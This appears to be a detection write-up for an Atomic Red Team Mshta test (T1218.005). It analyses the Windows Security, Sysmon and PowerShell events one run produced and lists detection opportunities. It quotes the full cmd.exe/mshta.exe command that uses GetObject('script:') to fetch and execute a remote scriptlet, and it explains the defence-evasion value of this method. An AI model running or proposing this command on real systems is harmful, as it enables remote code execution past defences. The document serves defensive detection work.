# T1218.005-1: Mshta — Mshta Executes JavaScript Scheme Fetch Remote Payload With GetObject

## Technique Context

T1218.005 (Mshta) is a defense evasion technique that abuses `mshta.exe`, the Microsoft HTML Application Host, to execute malicious code. Mshta.exe is a signed Windows binary that can execute HTA files as well as inline JavaScript or VBScript passed directly on the command line. In this test, `mshta.exe` receives a JavaScript command that uses the `GetObject()` function with a `script:` scheme URI to fetch and execute a remote Windows Script Component (`.sct` file) from GitHub.

The attack pattern is: PowerShell spawns `cmd.exe` which spawns `mshta.exe javascript:a=(GetObject('script:...')).Exec();close();`. The `script:` protocol handler triggers COM object resolution, downloading and executing the `.sct` file without a separate network-visible step from the logged process — the network activity originates from within the `mshta.exe` process itself.

## What This Dataset Contains

The dataset spans 2 seconds (2026-03-17T16:50:28Z to 16:50:30Z) across 143 total events: 110 PowerShell, 8 Security, 19 Sysmon, 6 Task Scheduler.

**Complete attack command line (Security EID 4688):** The `cmd.exe` process (PID 0x4048 / 16456) spawned by PowerShell (PID 0x3bf0) carried the full mshta GetObject command:

```
"cmd.exe" /c mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
```

This is the primary technique evidence — the complete attack string including the remote SCT URL is captured in the `cmd.exe` process creation event.

**Service and process activity surrounding the technique:** Security EID 4688 shows `sc.exe` (PID 0x3f68) starting `InventorySvc` — this is background Windows telemetry service activity triggered by the `\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser` scheduled task. The Task Scheduler events (EIDs 100, 107, 129, 200, 201, 202) document this task lifecycle. This is unrelated background activity that happened to coincide with the test window.

**Service logon (Security EID 4624/4672):** A Logon Type 5 service logon and special privileges event accompany the svchost service startup.

**CreateRemoteThread detection (Sysmon EID 8):** PowerShell (PID 15344) created a remote thread in an unknown process (PID 16456). The target process name is `<unknown process>` — this occurs when the target process terminates before Sysmon can resolve its image path. StartAddress: `0x00007FF7818C0570`. This event indicates that `mshta.exe` spawned, executed code, and exited rapidly enough that Sysmon lost the process reference. This is the indirect signature of `mshta.exe` executing and terminating.

**PowerShell module logging (EID 4103):** The `Write-Host "DONE"` parameter binding event confirms the technique completed — the test framework received a return and logged completion.

**Whoami.exe execution (Security EID 4688 and Sysmon EID 1):** Two `whoami.exe` executions (PIDs 0x4108 and 0x4044) are captured, both spawned by the test framework PowerShell. These are the pre- and post-execution context validation steps.

## What This Dataset Does Not Contain

**No `mshta.exe` process creation event (Sysmon EID 1, Security EID 4688):** The sysmon-modular config includes mshta.exe in its LOLBin process creation include rules, but no mshta.exe EID 1 event appears. This is explained by the Sysmon EID 8 CreateRemoteThread event with an `<unknown process>` target — mshta.exe executed and terminated before Sysmon captured its process create record (or the process create was captured in the 19 Sysmon total events but outside the sample set).

**No Sysmon EID 3 network connection from mshta.exe:** The SCT download to `raw.githubusercontent.com` is not captured. Network activity from within `mshta.exe` executing the `GetObject` call may have occurred too quickly or the process was already in its teardown phase.

## Assessment

The technique executed successfully — the `Write-Host "DONE"` output in PS EID 4103 and the Sysmon EID 8 CreateRemoteThread with unknown target confirm that `mshta.exe` ran and completed. The GetObject download and SCT execution happened within the brief window before process termination.

The contrast with the defended variant is significant. In the defended dataset (26 Sysmon, 9 Security, 42 PowerShell events), Windows Defender blocked the execution — `cmd.exe` exits with `0xC0000022` (STATUS_ACCESS_DENIED) and there is no mshta.exe activity at all. Here, without Defender, the technique runs to completion: `Write-Host "DONE"` appears in the PS logs, and the Sysmon EID 8 provides indirect evidence of mshta.exe creating threads in a transient process. The undefended dataset has 110 PowerShell events versus 42 in the defended run, reflecting the full script block logging without AMSI interference.

## Detection Opportunities Present in This Data

**`cmd.exe` command line containing `mshta.exe javascript:` and `GetObject('script:` (Security EID 4688):** The full attack command is preserved in the `cmd.exe` process creation event. The `script:` URI scheme within a `GetObject` call is specifically designed to fetch and execute a remote COM scriptlet — this pattern appears rarely in legitimate usage.

**`mshta.exe` invoked via `cmd.exe` spawned by PowerShell (Security EID 4688):** The ancestry chain PowerShell → cmd.exe → mshta.exe is a widely documented IOC. Legitimate users do not typically launch mshta.exe through PowerShell and cmd.exe.

**URL within `mshta.exe` command line arguments (Security EID 4688):** The GitHub raw content URL (`raw.githubusercontent.com`) embedded in the command line is itself a detection opportunity — mshta.exe command lines containing HTTPS URLs indicate remote payload retrieval.

**Sysmon EID 8 (CreateRemoteThread) from PowerShell to unknown process:** When a PowerShell process creates a remote thread in a process that exits before Sysmon resolves the target image, the `<unknown process>` marker can indicate transient process injection or a rapidly-executing command that ran and terminated. Combined with the PowerShell module log confirming "DONE", this pattern points to successful execution of a short-lived technique.
